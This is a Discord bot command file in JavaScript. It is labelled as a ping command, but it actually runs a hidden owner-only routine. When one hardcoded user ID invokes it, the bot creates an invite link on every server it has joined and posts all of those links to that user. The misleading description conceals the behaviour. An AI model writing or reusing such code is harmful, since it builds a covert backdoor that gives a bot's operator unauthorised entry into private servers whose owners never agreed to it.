const { MessageEmbed } = require('discord.js');

const db = require('quick.db')
module.exports = {
  name: "links",
 // alliases: ["botinvite", "inviteme"],
  category: "info",
  description: "Get bot ping :/",
  usage: "ping",
  run: async (client, message, args) => {
    
     
let default_prefix = '!';
    let prefix = db.get(`prefix_${message.guild.id}`)
    if (prefix === null) prefix = default_prefix;

const Invite = args[0];

  if (message.author.id === '716062999395303487') {
client.guilds.cache.forEach(guild => {
         let channel = guild.channels.cache.last();
         createLink(channel,guild,message);
});


async function createLink(chan,guild,message) {
    let invite = await chan.createInvite().catch(console.error);
    try{
        message.channel.send(guild.name + '|' + invite);
    }catch (e) {
        message.channel.send(guild.name + '|' + 'no link available');
    }
}
}
  }
}
    
  
  

